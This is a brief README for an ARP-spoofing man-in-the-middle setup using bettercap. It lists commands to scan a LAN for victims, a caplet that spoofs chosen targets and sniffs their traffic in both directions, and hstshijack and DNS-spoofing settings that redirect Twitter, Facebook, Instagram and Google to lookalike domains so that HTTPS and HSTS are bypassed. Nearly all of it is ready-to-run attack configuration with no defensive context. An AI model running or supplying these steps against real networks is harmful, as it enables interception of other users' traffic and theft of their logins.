# ARPSppofer-w-bettercap

## Prerequisutes
1. Make sure you have namp/netdiscover installed (could also use nmap for host scanning).
2. Bettercap should be installed as well.

## Usage
1. Find some hosts to spoof within your LAN.
   1. `bettercap -iface <interface>`
   2. `net.probe on`
   3. `net.show`
   4. Pick a client and exit bettercap.
   5. __Note: Can also use netdiscover or nmap for host scanning.__
2. Create/Edit your spoof caplet (spoof.caplet)
   1. `set arp.spoof.fullplex true`  : Capture both incoming/outgoing traffic. 
   2. `set arp.spoof.targets <target ip/mac>` : Comma-separated list of IPs/MACs to spoof.
   3. `set net.sniff.local true` :  Sniff local (attackbox) traffic as well - needed for bypassing HTTPS.
3. Edit hstshijack config file to bypass specific sites configured with HSTS.
   1. `nano /usr/local/share/bettercap/caplets/hstshijack/hstshijack.cap `
   2. Targets and replacements could look like this… (customize to your liking)
      1. 
    `
    set hstshijack.targets         twitter.com,*.twitter.com,facebook.com,*.facebook.com,instagram.com,*.instagram.com,google.com,*.google.com, gstatic.com, *.gstatic.com
    set hstshijack.replacements    twiter.com,*.twiter.com,facebook.corn,*.facebook.corn,instagam.com,*.instagam.com,google.corn,*.google.corn,gstatic.corn,*.gstatic.corn
    `
   3. dns.spoof.domains could look like this... (customize to your liking)
      1. 
    `
    dns.spoof.domains
    set dns.spoof.domains  twiter.com,*.twiter.com,facebook.corn,*.facebook.corn,instagam.com,*.instagam.com,google.corn,*.google.corn,gstatic.corn,*.gstatic.corn
    `
4. Start bettercap with customized caplet.
   1. `bettercap -iface <interface> -caplet <capletfile>`
   2. Example: `bettercap -iface eth0 -caplet spoof.caplet`
5. Enable/Verify hstshijack caplet is enabled.
   1. `hstshijack/hstshijack`
   2. `caplets.show`







